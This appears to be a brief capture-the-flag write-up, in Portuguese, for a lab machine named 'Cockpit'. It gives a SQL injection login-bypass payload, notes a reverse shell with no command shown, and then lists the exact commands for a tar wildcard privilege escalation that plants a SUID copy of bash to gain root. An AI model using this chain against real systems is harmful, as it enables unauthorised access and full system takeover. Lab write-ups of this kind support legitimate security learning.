# Cockpit
> SQL auth bypass + tar wildcard SUID

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

Painel web Cockpit identificado.

## Exploração

Bypass de autenticação via SQL injection no login:

```
user: admin'--
pass: qualquer
```

Acesso ao painel → upload de arquivo ou execução de comando.

Reverse shell obtido como www-data.

## Escalada de Privilégio

Binário `tar` com bit SUID e execução periódica com wildcard:

```
find / -perm -4000 2>/dev/null
ls -la /usr/bin/tar
```

Criação de arquivos maliciosos para explorar wildcard:

```
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash" > privesc.sh
chmod +x privesc.sh
```

```
/tmp/bash -p
```

Root obtido.
